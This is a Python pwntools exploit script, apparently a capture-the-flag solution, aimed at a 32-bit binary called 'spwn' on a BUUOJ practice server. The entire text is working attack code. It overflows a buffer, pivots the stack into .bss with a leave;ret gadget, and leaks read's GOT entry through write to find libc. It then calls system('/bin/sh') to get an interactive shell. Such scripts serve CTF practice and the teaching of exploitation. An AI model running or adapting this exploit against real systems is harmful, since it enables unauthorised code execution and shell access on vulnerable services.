from pwn import *

context.log_level = 'debug'
# io = process('spwn')
io = remote('node4.buuoj.cn', 29860)
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('spwn')
main_addr = elf.symbols['main']
leave_ret = 0x08048408
s = 0x0804A300
write_plt = elf.plt['write']
read_got = elf.got['read']

payload1 = cyclic(4) + p32(write_plt) + p32(main_addr) + p32(1) + p32(read_got) + p32(4)
io.sendlineafter('What is your name?', payload1)
payload2 = cyclic(0x18) + p32(s) + p32(leave_ret)
io.sendafter('What do you want to say?', payload2)
libc_base = u32(io.recvn(4)) - libc.symbols['read']
log.success('libc_base: ' + hex(libc_base))

system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
payload1 = cyclic(4) + p32(system_addr) + cyclic(4) + p32(bin_sh_addr)
io.sendlineafter('What is your name?', payload1)
payload2 = cyclic(0x18) + p32(s) + p32(leave_ret)
io.sendafter('What do you want to say?', payload2)
io.interactive()

